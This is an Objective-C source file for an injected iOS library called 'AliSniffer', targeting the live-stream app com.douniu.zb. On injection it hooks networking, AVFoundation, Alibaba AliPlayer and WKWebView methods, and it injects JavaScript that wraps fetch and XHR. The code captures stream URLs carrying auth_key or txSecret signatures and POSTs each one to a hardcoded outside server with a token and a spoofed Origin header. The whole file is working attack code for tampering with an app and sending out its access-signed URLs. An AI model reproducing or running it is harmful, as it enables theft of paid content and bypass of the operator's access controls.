// AliSniffer.m — 针对 com.douniu.zb 定制（阿里云 SDK 命中）
// 功能：优先抓含 auth_key 的播放地址；上报到你的服务器；弹窗复制；尽量安全、不改业务行为。
// 需链接：-framework UIKit -framework Foundation -framework WebKit -framework AVFoundation -framework CoreMedia

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

// ====== 配置 ======
static NSString * const PUSH_HOST = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static NSArray<NSString*> *pushPaths(void) { return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0; // 相同 URL 60 秒内不上报
static const BOOL kPopupOnAuth = YES;             // 含 auth_key 的 URL 弹窗+复制
static const BOOL kPopupOnPlain = YES;            // 非 auth_key 的 URL 是否也弹窗（要静默就改为 NO）
static const BOOL kShowBootPopup = YES;           // 注入成功提示

// ====== 调试输出 ======
#ifndef ENABLE_DEBUG_LOG
#define ENABLE_DEBUG_LOG 0
#endif
#if ENABLE_DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

// ====== 工具 ======
static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

static inline void on_main(void (^b)(void)){ if ([NSThread isMainThread]) b(); else dispatch_async(dispatch_get_main_queue(), b); }

static BOOL hasAuthKey(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return ([s containsString:@"auth_key="] || [s containsString:@"txsecret="] || [s containsString:@"txkey="]);
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@"rtmp://"]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"replay"]||[s containsString:@"pull.kuniunet"]) return YES;
    if (hasAuthKey(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    __block BOOL skip=NO;
    dispatch_sync(gq, ^{
        NSDate *last=g_seen[u]; NSDate*now=[NSDate date];
        if (last && [now timeIntervalSinceDate:last]<kDedupeWindow) skip=YES;
        else g_seen[u]=now;
    });
    return skip;
}

static void popup(NSString *title, NSString *msg, NSString *copyStr){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win=nil;
            if (@available(iOS 13.0,*)){
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                    if (sc.activationState==UISceneActivationStateForegroundActive){
                        for (UIWindow *w in sc.windows){ if (w.isKeyWindow){win=w;break;} }
                        if (win) break;
                    }
                }
            } else { win=UIApplication.sharedApplication.keyWindow; }
            if (!win) win=UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc=win.rootViewController; while(vc.presentedViewController) vc=vc.presentedViewController;

            UIAlertController *ac=[UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyStr){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string=copyStr;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(NSException*e){ LOG(@"popup err:%@",e); }
    });
}

// 上报（依次尝试 /api/push_raw -> /push_raw -> /push）
static void post_text(NSString *text, void (^done)(BOOL)){
    if (!text){ if(done)done(NO); return; }
    __block NSInteger idx=0; NSArray *paths=pushPaths();
    __block void (^tryNext)(void)=^{
        if (idx>=paths.count){ if(done)done(NO); return; }
        NSString *p=paths[idx++]; NSString *url=[PUSH_HOST stringByAppendingString:p];
        NSMutableURLRequest *req=[NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod=@"POST";
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody=[text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (!e && sc>=200 && sc<300){ if(done)done(YES); }
            else tryNext();
        }] resume];
    }; tryNext();
}

static void handleURL(NSString *u, NSString *where){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;

    BOOL auth = hasAuthKey(u);
    NSString *title = auth? @"捕获到直播源（auth_key）" : @"捕获到直播源";
    NSString *msg   = where? [NSString stringWithFormat:@"%@\n%@", where, u] : u;

    post_text(u, ^(BOOL ok){
        LOG(@"POST %@ -> %@", u, ok?@"OK":@"FAIL");
        if (auth){
            if (kPopupOnAuth){ popup(title, msg, u); UIPasteboard.generalPasteboard.string=u; }
        }else{
            if (kPopupOnPlain){ popup(title, msg, u); UIPasteboard.generalPasteboard.string=u; }
        }
    });
}

// ====== 细节 Hook（保存原实现）======

// NSURLSessionTask -resume
static void (*orig_task_resume)(id,SEL);
static void sn_task_resume(id self, SEL _cmd){
    @try{
        NSURLRequest *req=nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req=((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req=((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        if (req.URL.absoluteString) dispatch_async(gq, ^{ handleURL(req.URL.absoluteString, @"NSURLSessionTask"); });
    }@catch(NSException*e){ LOG(@"resume sniff err:%@",e); }
    if (orig_task_resume) orig_task_resume(self,_cmd);
}

// AVPlayerItem +playerItemWithURL:
static id (*orig_AVPI_url)(id,SEL,id);
static id sn_AVPI_url(id self, SEL _cmd, NSURL *URL){
    @try{ if (URL.absoluteString) dispatch_async(gq,^{ handleURL(URL.absoluteString, @"AVPlayerItem"); }); }@catch(NSException*e){}
    return orig_AVPI_url? orig_AVPI_url(self,_cmd,URL):nil;
}
// AVURLAsset +URLAssetWithURL:options:
static id (*orig_AVUA_urlopt)(id,SEL,id,id);
static id sn_AVUA_urlopt(id self, SEL _cmd, NSURL *URL, id opt){
    @try{ if (URL.absoluteString) dispatch_async(gq,^{ handleURL(URL.absoluteString, @"AVURLAsset"); }); }@catch(NSException*e){}
    return orig_AVUA_urlopt? orig_AVUA_urlopt(self,_cmd,URL,opt):nil;
}

// AVPUrlSource：+urlWithString: / -setUrl:
static void hook_AVPUrlSource(void){
    Class c=objc_getClass("AVPUrlSource"); if (!c) return;
    // +urlWithString:
    SEL cs=sel_getUid("urlWithString:");
    Method m=class_getClassMethod(c, cs);
    if (m){
        IMP orig=method_getImplementation(m);
        IMP newImp=imp_implementationWithBlock(^id(id _self, NSString* s){
            @try{ if (s) dispatch_async(gq,^{ handleURL(s, @"AVPUrlSource.urlWithString"); }); }@catch(NSException*e){}
            if (orig){ id(*fn)(id,SEL,NSString*)=(id(*)(id,SEL,NSString*))orig; return fn(_self,cs,s); }
            return (id)nil;
        });
        method_setImplementation(m,newImp);
    }
    // -setUrl:
    SEL is=sel_getUid("setUrl:");
    Method im=class_getInstanceMethod(c, is);
    if (im){
        IMP orig=method_getImplementation(im);
        IMP newImp=imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s) dispatch_async(gq,^{ handleURL(s, @"AVPUrlSource.setUrl"); }); }@catch(NSException*e){}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,is,s); }
        });
        method_setImplementation(im,newImp);
    }
}

// AliPlayer：-setUrl:、-setStsSource:、-setAuthSource:、-setMpsSource:
static void hook_AliPlayer(void){
    Class c=objc_getClass("AliPlayer"); if (!c) return;

    // -setUrl:
    SEL su=sel_getUid("setUrl:");
    Method mu=class_getInstanceMethod(c, su);
    if (mu){
        IMP orig=method_getImplementation(mu);
        IMP newImp=imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s) dispatch_async(gq,^{ handleURL(s, @"AliPlayer.setUrl"); }); }@catch(NSException*e){}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,su,s); }
        });
        method_setImplementation(mu,newImp);
    }

    NSArray<NSString*> *srcSels=@[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
    for (NSString *name in srcSels){
        SEL s=sel_getUid(name.UTF8String);
        Method m=class_getInstanceMethod(c, s);
        if (!m) continue;
        IMP orig=method_getImplementation(m);
        IMP newImp=imp_implementationWithBlock(^(id _self, id src){
            @try{
                NSString *u=nil;
                if ([src respondsToSelector:@selector(valueForKey:)]){
                    @try{ u=[src valueForKey:@"url"]; }@catch(...){}
                    if (!u){ @try{ u=[src valueForKey:@"playUrl"]; }@catch(...){} }
                }
                if (u) dispatch_async(gq,^{ handleURL(u, [@"AliPlayer." stringByAppendingString:name]); });
            }@catch(NSException*e){}
            if (orig){ void(*fn)(id,SEL,id)=(void(*)(id,SEL,id))orig; fn(_self,s,src); }
        });
        method_setImplementation(m,newImp);
    }
}

// WKWebView：安全注入只读 JS（拦 fetch/XHR 的 URL）
static void hook_WKWebView(void){
    Class c=objc_getClass("WKWebView"); if (!c) return;
    SEL s=sel_getUid("loadRequest:");
    Method m=class_getInstanceMethod(c, s);
    if (!m) return;
    IMP orig=method_getImplementation(m);
    IMP newImp=imp_implementationWithBlock(^(id self, NSURLRequest *req){
        @try{
            if (req.URL.absoluteString) dispatch_async(gq,^{ handleURL(req.URL.absoluteString, @"WKWebView.loadRequest"); });
        }@catch(NSException*e){}
        if (orig){ void(*fn)(id,SEL,NSURLRequest*)=(void(*)(id,SEL,NSURLRequest*))orig; fn(self,s,req); }
        on_main(^{
            @try{
                NSString *js =
                @"(function(){"
                " function sniff(u){try{ if(!u)return; window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.snifferHandler&&window.webkit.messageHandlers.snifferHandler.postMessage(u);}catch(e){} }"
                " var o=XMLHttpRequest.prototype.open; if(o){XMLHttpRequest.prototype.open=function(m,u){try{sniff(u);}catch(e){}; return o.apply(this,arguments);};}"
                " if(window.fetch){var f=window.fetch; window.fetch=function(){try{if(arguments&&arguments[0]) sniff(arguments[0].toString());}catch(e){}; return f.apply(this,arguments);};}"
                "})();";
                [(WKWebView*)self evaluateJavaScript:js completionHandler:nil];
            }@catch(NSException*e){}
        });
    });
    method_setImplementation(m,newImp);
}

// ====== 入口 ======
__attribute__((constructor))
static void init_sniffer(void){
    @try{
        if (!gq) gq=dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen=[NSMutableDictionary dictionary];

        if (kShowBootPopup) popup(@"AliSniffer", @"嗅探器已注入", nil);

        // 兜底 Hooks
        Class t=objc_getClass("NSURLSessionTask");
        if (t){
            Method m=class_getInstanceMethod(t, sel_getUid("resume"));
            if (m){ orig_task_resume=(void(*)(id,SEL))method_getImplementation(m);
                    method_setImplementation(m, (IMP)sn_task_resume); }
        }
        Class avpi=objc_getClass("AVPlayerItem");
        if (avpi){
            Method m=class_getClassMethod(avpi, sel_getUid("playerItemWithURL:"));
            if (m){ orig_AVPI_url=(id(*)(id,SEL,id))method_getImplementation(m);
                    method_setImplementation(m, (IMP)sn_AVPI_url); }
        }
        Class avua=objc_getClass("AVURLAsset");
        if (avua){
            Method m=class_getClassMethod(avua, sel_getUid("URLAssetWithURL:options:"));
            if (m){ orig_AVUA_urlopt=(id(*)(id,SEL,id,id))method_getImplementation(m);
                    method_setImplementation(m, (IMP)sn_AVUA_urlopt); }
        }

        // 精准命中阿里云
        hook_AVPUrlSource();
        hook_AliPlayer();

        // WK 注入
        hook_WKWebView();

    }@catch(NSException*e){ LOG(@"bootstrap err:%@",e); }
}
